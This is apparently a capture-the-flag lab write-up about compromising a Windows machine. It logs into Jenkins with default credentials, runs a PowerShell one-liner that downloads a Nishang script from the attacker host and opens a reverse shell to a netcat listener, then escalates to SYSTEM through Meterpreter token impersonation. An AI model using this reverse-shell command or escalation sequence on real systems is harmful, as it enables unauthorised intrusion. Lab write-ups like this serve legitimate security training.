To conduct penetration testing on a vulnerable Windows system by exploiting Jenkins vulnerabilities for initial access, followed by privilege escalation to SYSTEM level. The ultimate goal was to retrieve the root.txt flag as proof of successful exploitation.

Tools Used
Kali Linux (attacker machine)

Metasploit Framework (exploitation & post-exploitation)

msfvenom (payload creation)

Meterpreter (post-exploitation & privilege escalation)

PowerShell (script execution on target)

Nmap (network scanning & reconnaissance)

Testing Phases
1. Target System Scanning with Nmap
The first step was reconnaissance to identify open ports and services using:

bash
nmap -sC -sV -A 10.10.115.34
Scan Results:

PORT     STATE SERVICE    VERSION  
80/tcp   open  http       Microsoft IIS httpd 7.5  
3389/tcp open  tcpwrapped  
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT  
Findings:

Port 80: Microsoft IIS 7.5 web server

Port 3389: RDP (Remote Desktop Protocol)

Port 8080: Jenkins running on Jetty

2. Gaining Initial Access via Jenkins
The Jenkins service on port 8080 was identified as the primary entry point.

Action: Login attempt with default credentials admin:admin → successful access.

Exploitation Method: Uploading and executing a PowerShell reverse shell script.

Reverse Shell Command (Nishang):

powershell
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.166.245:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.166.245 -Port 9001"
Hosting the Script on Kali (HTTP Server):

bash
python3 -m http.server 8000
Netcat Listener for Connection:

bash
nc -lvnp 9001
Result: Obtained an interactive PowerShell session as user bruce.

3. Retrieving the user.txt Flag
After gaining access, the user flag was located in the user’s desktop directory:

powershell
type C:\Users\bruce\Desktop\user.txt
Flag:

79007a09481963edf2e1321abd9ae2a0
4. Privilege Escalation to SYSTEM
Checking user privileges revealed SeDebugPrivilege and SeImpersonatePrivilege, enabling privilege escalation.

Checking Privileges:

powershell
whoami /priv
Output:

SeDebugPrivilege                Debug programs                            Enabled  
SeImpersonatePrivilege          Impersonate a client after authentication Enabled  
Using Metasploit’s incognito Module:

bash
load incognito  
list_tokens -g  
impersonate_token "BUILTIN\Administrators"  
Verifying Access:

powershell
whoami
Result:

NT AUTHORITY\SYSTEM
5. Attempting to Retrieve root.txt
Despite SYSTEM access, the root.txt flag (typically in C:\Windows\System32\config) could not be retrieved due to filesystem restrictions.

Conclusions & Results
Initial Access: Achieved via Jenkins default credentials and a PowerShell reverse shell.

Privilege Escalation: Leveraged SeDebugPrivilege and SeImpersonatePrivilege to escalate to SYSTEM.

Flag Retrieval:

user.txt → Successfully obtained.

root.txt → Access blocked by additional restrictions.

The project demonstrated the risks of unsecured Jenkins instances and the effectiveness of PowerShell and Metasploit in post-exploitation.

Key Learnings
✅ Exploiting Jenkins vulnerabilities for initial access.
✅ Reverse shell deployment via PowerShell and Netcat.
✅ Privilege escalation using Metasploit’s incognito.
✅ Analyzing system restrictions on protected files.

Final Outcome: Successful penetration with SYSTEM escalation, though root.txt remained inaccessible.
